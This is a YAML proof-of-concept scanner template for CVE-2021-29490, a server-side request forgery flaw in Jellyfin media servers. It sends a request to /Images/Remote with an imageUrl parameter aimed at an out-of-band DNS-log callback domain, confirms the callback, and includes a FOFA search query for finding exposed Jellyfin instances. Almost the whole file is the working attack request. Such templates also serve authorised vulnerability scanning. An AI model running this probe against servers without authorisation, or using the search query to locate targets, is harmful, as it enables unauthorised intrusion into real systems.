id: poc-yaml-jellyfin-imageurl-ssrf
info:
  name: jellyfin 服务端请求伪造（CVE-2021-29490）
  severity: medium
  tags:
  - DNSLOG
  - ssrf
  - CVE-2021-29490
  finger: jellyfin
  fofa: body="jellyfin"
variables:
  reverse: new_dns_log()
  reverseDomain: reverse.Domain()
requests:
- method: GET
  path: /Images/Remote?imageUrl=https://{{.reverseDomain}}/
  expression: 'reverse.Verify()

    '
transport: http
